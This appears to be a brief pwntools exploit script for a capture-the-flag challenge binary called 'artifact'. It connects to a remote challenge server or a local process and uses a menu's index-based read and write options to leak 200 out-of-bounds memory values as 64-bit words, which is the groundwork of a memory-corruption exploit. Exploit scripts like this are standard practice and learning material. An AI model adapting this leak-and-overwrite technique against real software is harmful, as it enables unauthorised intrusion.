
from pwn import *
# import fn; from fn import _
import re

context(arch="amd64")

# conn = remote('1.2.3.4', 31337)
if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    conn = remote("52.192.178.153", 31337)
else:
    conn = process('./artifact')
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
        gdb.attach(conn)
        sleep(2)

def write_idx(idx, num):
    text = conn.recvuntil('Choice?')
    conn.sendline('2 ' + str(idx) + " " + str(num)) # local testing

def leak_idx(idx):
    text = conn.recvuntil('Choice?')
    conn.sendline('1 ' + str(idx)) # local testing
    conn.recvuntil("Here it is")
    return conn.recvline()

for i in xrange(200):
    leak = leak_idx(200+i);
    leak = leak[2:-1]
    print p64(int(leak))
